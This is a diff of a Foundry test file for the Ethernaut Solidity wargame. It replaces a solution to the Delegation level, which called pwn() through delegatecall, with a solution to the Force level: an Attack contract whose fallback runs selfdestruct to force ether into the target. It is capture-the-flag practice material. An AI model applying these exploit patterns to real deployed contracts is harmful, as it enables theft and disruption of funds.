@@ -1,11 +1,23 @@
 pragma solidity >=0.8.19;
 
 import { Test } from "forge-std/Test.sol";
-import { Delegation } from "src/Delegation/Delegation.sol";
-import { DelegationFactory } from "src/Delegation/DelegationFactory.sol";
+import { Force } from "src/Force/Force.sol";
+import { ForceFactory } from "src/Force/ForceFactory.sol";
 import { Ethernaut } from "src/Ethernaut.sol";
 
-contract DelegationTest is Test {
+contract Attack {
+    address victim;
+    
+    constructor(address _victim) {
+        victim = _victim;
+    }
+
+    fallback() external payable {
+        selfdestruct(payable(victim));
+    }
+}
+
+contract ForceTest is Test {
     Ethernaut ethernaut;
     address me = makeAddr("me");
     
@@ -13,16 +25,18 @@ contract DelegationTest is Test {
         ethernaut = new Ethernaut();
     }
 
-    function testDelegationHack() external {
+    function testForceHack() external {
         // level setup
-        DelegationFactory factory = new DelegationFactory();
+        ForceFactory factory = new ForceFactory();
         ethernaut.registerLevel(factory);
         vm.startPrank(me);
         address levelAddress = ethernaut.createLevelInstance(factory);
-        Delegation delegation = Delegation(payable(levelAddress));
+        Force force = Force(payable(levelAddress));
 
         // attack
-        address(delegation).call(abi.encodeWithSignature("pwn()"));
+        vm.deal(me, 1 ether);
+        Attack attack = new Attack(address(force));
+        address(attack).call{value: 10 wei}(new bytes(0));
         
         // submission
         bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
